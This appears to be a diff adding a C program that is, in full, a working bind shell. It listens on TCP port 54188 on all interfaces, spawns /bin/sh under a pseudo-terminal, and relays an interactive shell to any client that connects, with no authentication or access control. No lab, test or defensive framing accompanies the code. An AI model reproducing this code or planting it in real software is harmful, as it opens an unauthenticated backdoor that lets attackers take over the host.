@@ -1,0 +1,148 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <pty.h>
+#include <arpa/inet.h>
+#include <sys/select.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <termios.h> // Include for terminal control
+
+#define PORT 54188
+#define BUFFER_SIZE 1024
+
+int main() {
+    int server_fd, client_fd, master_fd;
+    struct sockaddr_in server_addr, client_addr;
+    socklen_t addr_len = sizeof(client_addr);
+    char buffer[BUFFER_SIZE];
+
+    // Create a socket
+    server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (server_fd < 0) {
+        perror("Socket creation failed");
+        exit(EXIT_FAILURE);
+    }
+
+	int optval = 1; 
+	setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)); 
+
+    // Configure server address
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    server_addr.sin_port = htons(PORT);
+
+    // Bind the socket
+    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("Bind failed");
+        close(server_fd);
+        exit(EXIT_FAILURE);
+    }
+
+    // Listen for connections
+    if (listen(server_fd, 5) < 0) {
+        perror("Listen failed");
+        close(server_fd);
+        exit(EXIT_FAILURE);
+    }
+
+    printf("Server listening on port %d...\n", PORT);
+
+    // Accept a client connection
+    client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &addr_len);
+    if (client_fd < 0) {
+        perror("Accept failed");
+        close(server_fd);
+        exit(EXIT_FAILURE);
+    }
+
+    printf("Client connected.\n");
+
+    // Fork a new process with a pseudo-terminal
+    pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);
+    if (pid < 0) {
+        perror("forkpty failed");
+        close(client_fd);
+        close(server_fd);
+        exit(EXIT_FAILURE);
+    }
+
+	// Inside the parent process after `forkpty`
+	struct termios term_attrs;
+
+	// Get the current attributes of the PTY
+	if (tcgetattr(master_fd, &term_attrs) < 0) {
+		perror("tcgetattr failed");
+		close(client_fd);
+		close(master_fd);
+		exit(EXIT_FAILURE);
+	}
+
+	// Disable echo
+	term_attrs.c_lflag &= ~ECHO;
+
+	// Set the new attributes
+	if (tcsetattr(master_fd, TCSANOW, &term_attrs) < 0) {
+		perror("tcsetattr failed");
+		close(client_fd);
+		close(master_fd);
+		exit(EXIT_FAILURE);
+	}
+
+	if (pid == 0) { // Child process
+		// In the child process, forkpty already redirects stdin, stdout, and stderr to the PTY
+		// execl("/bin/sh", "sh", "-i", NULL); // Run the shell in interactive mode
+		execl("/bin/sh", "sh", NULL);
+
+		// If execl fails
+		perror("execl failed");
+		exit(EXIT_FAILURE);
+	} else { // Parent process
+		close(server_fd); // Close listening socket in parent process
+
+		// Relay data between client and PTY
+		while (1) {
+			fd_set read_fds;
+			FD_ZERO(&read_fds);
+			FD_SET(client_fd, &read_fds);
+			FD_SET(master_fd, &read_fds);
+
+			int max_fd = (client_fd > master_fd) ? client_fd : master_fd;
+
+			if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
+				perror("select failed");
+				break;
+			}
+
+			// If data is received from the client
+			if (FD_ISSET(client_fd, &read_fds)) {
+				ssize_t bytes_received = recv(client_fd, buffer, BUFFER_SIZE, 0);
+				if (bytes_received <= 0) {
+					printf("Client disconnected.\n");
+					break;
+				}
+				write(master_fd, buffer, bytes_received); // Send data to PTY
+			}
+
+			// If data is received from the PTY
+			if (FD_ISSET(master_fd, &read_fds)) {
+				ssize_t bytes_read = read(master_fd, buffer, BUFFER_SIZE);
+				if (bytes_read <= 0) {
+					printf("Shell session ended.\n");
+					break;
+				}
+
+				send(client_fd, buffer, bytes_read, 0); // Send shell output to client
+			}
+		}
+
+		close(client_fd);
+		close(master_fd);
+		waitpid(pid, NULL, 0); // Wait for the child process to finish
+	}
+
+    printf("Server closed.\n");
+    return 0;
+}
+
